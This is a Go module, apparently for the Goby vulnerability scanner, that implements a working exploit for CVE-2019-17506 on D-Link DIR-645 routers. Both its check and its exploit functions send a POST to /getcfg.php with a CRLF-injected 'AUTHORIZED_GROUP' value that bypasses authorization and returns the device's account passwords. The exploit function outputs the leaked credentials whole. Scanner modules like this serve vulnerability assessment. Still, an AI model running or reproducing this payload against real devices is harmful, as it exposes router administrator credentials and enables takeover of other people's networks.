package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"regexp"
)

func init() {
	expJson := `{
  "Name": "D-Link Dir-645 getcfg.php Account password disclosure (CVE-2019-17506)",
  "Description": "D-Link Dir-645 getcfg.php Account password disclosure (CVE-2019-17506)",
  "Product": "D-Link Dir-645",
  "Homepage": "http://www.dlink.com.cn/",
  "DisclosureDate": "2021-05-18",
  "Author": "PeiQi",
  "GobyQuery": "app=\"DLink-Wireless-Router\"",
  "Level": "1",
  "Impact": "Account password disclosure",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": null,
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["Account password disclosure"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["D-Link Dir-645"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/getcfg.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "password")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/getcfg.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
            		expResult.Output = resp.Utf8Html
            		expResult.Success = true
        	}
			return expResult
		},
	))
}